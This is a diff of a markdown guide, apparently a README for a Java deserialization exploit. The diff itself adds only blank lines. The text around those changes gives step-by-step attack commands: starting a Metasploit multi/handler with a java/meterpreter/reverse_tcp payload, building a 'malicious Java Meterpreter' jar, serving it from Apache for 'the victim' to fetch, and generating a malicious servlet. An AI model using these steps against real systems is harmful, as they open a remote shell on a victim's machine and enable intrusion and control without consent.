@@ -60,9 +60,13 @@ Inject `java_meterpreter_reverse_tcp.jar` into our main class within `exserial.j
 
 Set that **MSF handler** running ->
 ` use exploit/multi/handler `
+
 ` set PAYLOAD java/meterpreter/reverse_tcp `
+
 ` set LHOST x.x.x.x `
+
 ` set LPORT 1234 `
+
 ` exploit -j `
 
 Create a malicious **Java Meterpreter** ->
@@ -70,6 +74,7 @@ Create a malicious **Java Meterpreter** ->
 
 Host that bad boy on your **webserver**, make sure that the victim will be able to access this ->
 ` mv ./my_reverse_meterpreter.jar /var/www/html/`
+
 ` service apache2 start` <- Or whatever HTTP Server you prefer :)
 
 Generate your malicious **servlet** ->
